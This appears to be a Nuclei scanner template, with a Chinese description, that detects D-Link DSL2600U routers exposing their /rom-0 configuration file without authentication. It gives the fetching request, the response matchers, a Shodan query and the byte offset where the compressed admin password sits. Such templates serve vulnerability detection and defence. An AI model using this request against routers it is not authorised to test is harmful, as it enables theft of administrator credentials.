id: dlink-dsl2600u-rom0-disclosure

info:
  name: D-Link DSL2600U - 未认证 rom-0 配置泄露
  author: 0x_Akoko
  severity: high
  description: |-
    检测到 D-Link DSL2600U 路由器未要求认证即暴露 /rom-0 二进制配置文件。该文件在字节偏移量 8568（0x2178）处以 LZS 压缩数据形式存储管理员密码，且整个二进制文件中不存在任何明文副本。
  reference:
    - https://cxsecurity.com/issue/WLB-2026060012
  metadata:
    verified: true
    max-request: 1
    vendor: d-link
    product: dsl-2600u
    shodan-query: DSL-2600U
    tags: dlink,router,misconfig,iot,unauth,disclosure

http:
  - raw:
      - |
        GET /rom-0 HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(header, "RomPager")'
          - 'contains(body, "Hdbgarea")'
          - 'content_length == 16384'
        condition: and
